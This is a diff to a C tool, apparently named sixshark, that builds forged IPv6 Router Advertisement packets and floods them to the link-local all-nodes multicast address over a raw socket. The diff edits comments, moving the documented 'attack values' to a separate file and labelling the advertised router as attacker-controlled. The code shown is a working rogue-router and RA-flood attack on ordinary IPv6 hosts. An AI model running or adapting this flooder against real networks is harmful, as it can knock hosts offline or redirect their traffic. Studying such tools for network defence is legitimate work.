@@ -18,72 +18,54 @@
 #include <time.h>
 #include <errno.h>
 
-// Data structures
+// Data structures for the forged Router Advertisement packet. Field
+// meanings below are what's needed to read the code; the RFC 4861
+// section references, the union's three interpretations, and why
+// create_packet() fills each field with the specific value it does
+// (the "attack values") are documented in docs/sixshark.md.
+
 // ICMPv6 Router Advertisement Header (16 bytes total)
-// RFC 4861 Section 4.2
 typedef struct ICMPv6
 {
     uint8_t type;           // ICMPv6 message type (134 = Router Advertisement)
     uint8_t code;           // Message subtype (always 0 for RA)
     uint16_t checksum;      // ICMPv6 checksum (kernel auto-calculates, set to 0)
-    
-    // 4-byte data field - interpreted differently based on message type
-    union 
+
+    // 4-byte field, reinterpreted depending on which piece you need to set
+    union
     {
-        uint32_t data32;    // Access all 4 bytes as single 32-bit value
-        uint16_t data16[2]; // Access as two 16-bit values: [0]=hop+flags, [1]=lifetime
-        uint8_t data8[4];   // Access as four 8-bit values: [0]=hop, [1]=flags, [2-3]=lifetime
+        uint32_t data32;
+        uint16_t data16[2]; // [0] = hop limit + flags, [1] = router lifetime
+        uint8_t data8[4];   // [0] = hop limit, [1] = flags, [2-3] = lifetime
     } data;
-    // For Router Advertisement:
-    //   data8[0] = Cur Hop Limit (suggested TTL for outgoing packets, typically 64)
-    //   data8[1] = Flags (M=Managed, O=Other config, both 0 for pure SLAAC)
-    //   data16[1] = Router Lifetime in seconds (0-65535, higher = more preferred)
-    //               Attack value: 65535 (maximum priority)
 
     uint32_t r_time;        // Reachable time in milliseconds (0 = unspecified)
-                            // How long a neighbor is considered reachable
-                            // Attack value: 0 (don't care)
-    
-    uint32_t rtrans_time;   // Retransmit timer in milliseconds (0 = unspecified)  
-                            // How long between neighbor solicitation retransmits
-                            // Attack value: 0 (don't care)
+    uint32_t rtrans_time;   // Retransmit timer in milliseconds (0 = unspecified)
 } __attribute__((packed)) ICMPv6;
 
 // Prefix Information Option (Type 3) - 32 bytes total
-// RFC 4861 Section 4.6.2
 // Tells clients what IPv6 prefix to use for address autoconfiguration
 typedef struct PrefixInfo
 {
     uint8_t type;               // Option type (3 = Prefix Information)
     uint8_t length;             // Length in units of 8 bytes (4 = 32 bytes total)
     uint8_t prefix_len;         // Prefix length in bits (typically 64 for SLAAC)
-    uint8_t flags;              // Prefix flags:
-                                //   0x80 (L bit) = On-link (prefix is on this network segment)
-                                //   0x40 (A bit) = Autonomous (use for SLAAC address config)
-                                //   Attack value: 0xC0 (both L and A set)
-    
+    uint8_t flags;              // 0x80 = On-link (L), 0x40 = Autonomous/SLAAC (A)
     uint32_t valid_lifetime;    // Seconds prefix is valid for address config
-                                // Attack value: 86400 (24 hours) or 0xFFFFFFFF (infinite)
-    
     uint32_t preferred_lifetime; // Seconds prefix is preferred for new connections
-                                 // Attack value: 86400 (24 hours) or 0xFFFFFFFF (infinite)
-    
     uint32_t reserved;          // Must be 0
-    
-    struct in6_addr prefix;     // The actual IPv6 prefix (128 bits / 16 bytes)
-                                // Attack value: fd00:dead:beef:: (ULA range)
-                                // Only first prefix_len bits matter (e.g., first 64 bits for /64)
+    struct in6_addr prefix;     // Advertised IPv6 prefix; only the first
+                                 // prefix_len bits matter (e.g. first 64 for /64)
 } __attribute__((packed)) PrefixInfo;
 
 // Source Link-Layer Address Option (Type 1) - 8 bytes total
-// RFC 4861 Section 4.6.1
-// Provides router's MAC address so clients can send packets without doing ND
+// Provides the router's MAC address so clients can send packets without
+// doing neighbor discovery first
 typedef struct SourceLLAddr
 {
     uint8_t type;       // Option type (1 = Source Link-Layer Address)
     uint8_t length;     // Length in units of 8 bytes (1 = 8 bytes total)
-    uint8_t mac[6];     // MAC address of the router (your attacker MAC)
-                        // Attack value: your interface's actual MAC address
+    uint8_t mac[6];     // MAC address of the (attacker-controlled) router
 } __attribute__((packed)) SourceLLAddr;
 
 
@@ -95,35 +77,6 @@ typedef struct Packet
     PrefixInfo prefix;      // Advertised IPv6 prefix for autoconfiguration
     SourceLLAddr source_ll; // Router's MAC address
 } __attribute__((packed)) Packet;
-
-/*
- * Attack Configuration Summary:
- * 
- * ICMPv6 Header:
- *   - type: 134
- *   - code: 0
- *   - checksum: 0 (kernel fills this)
- *   - data8[0] (hop limit): 64
- *   - data8[1] (flags): 0 (M=0, O=0 for pure RA attack)
- *   - data16[1] (router lifetime): 65535 (maximum priority)
- *   - r_time: 0
- *   - rtrans_time: 0
- * 
- * Prefix Option:
- *   - type: 3
- *   - length: 4
- *   - prefix_len: 64
- *   - flags: 0xC0 (L=1, A=1)
- *   - valid_lifetime: 86400 (24 hours)
- *   - preferred_lifetime: 86400 (24 hours)
- *   - reserved: 0
- *   - prefix: fd00:dead:beef:: (or user-specified)
- * 
- * Source LL Option:
- *   - type: 1
- *   - length: 1
- *   - mac: [your interface MAC]
- */
 
 // Function prototypes
 
@@ -240,6 +193,9 @@ int generate_random_prefix(char *prefix)
     return 0;
 }
 
+// Fills p with a forged Router Advertisement. The specific values used
+// below (lifetimes, flags, etc.) are the "attack values" documented in
+// docs/sixshark.md, not arbitrary defaults.
 int create_packet(Packet *p, const uint8_t *mac, const char *prefix)
 {
     p->icmp6_hdr.type = 134;
@@ -276,6 +232,8 @@ int create_packet(Packet *p, const uint8_t *mac, const char *prefix)
 
 int run_flood(Packet *p, int delay, const char *interface, bool progress)
 {
+    // RFC 4861 requires a hop limit of exactly 255 on received RAs; hosts
+    // silently discard anything else as a guard against off-link spoofing.
     int hops = 255;
     int bufsize = 1024 * 1024;
     int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
@@ -319,7 +277,9 @@ int run_flood(Packet *p, int delay, const char *interface, bool progress)
     memset(&dest, 0, sizeof(dest));
 
     dest.sin6_family = AF_INET6;
-    inet_pton(AF_INET6, "ff02::1", &dest.sin6_addr);
+    inet_pton(AF_INET6, "ff02::1", &dest.sin6_addr); // link-local all-nodes multicast
+    // Link-local multicast is scoped per-interface; the kernel needs to
+    // know which interface to send out on since the address alone doesn't say.
     dest.sin6_scope_id = if_nametoindex(interface);
 
     if(dest.sin6_scope_id == 0)
@@ -343,6 +303,9 @@ int run_flood(Packet *p, int delay, const char *interface, bool progress)
         int bytes_sent = sendto(sock, p, sizeof(Packet), 0, (struct sockaddr *)&dest, sizeof(dest));
         if(bytes_sent < 0)
         {
+            // Transient: the kernel's send queue is momentarily full from
+            // sending as fast as possible. Back off briefly and retry
+            // rather than treating it as a fatal error.
             if(errno == ENOBUFS)
             {
                 usleep(1000);
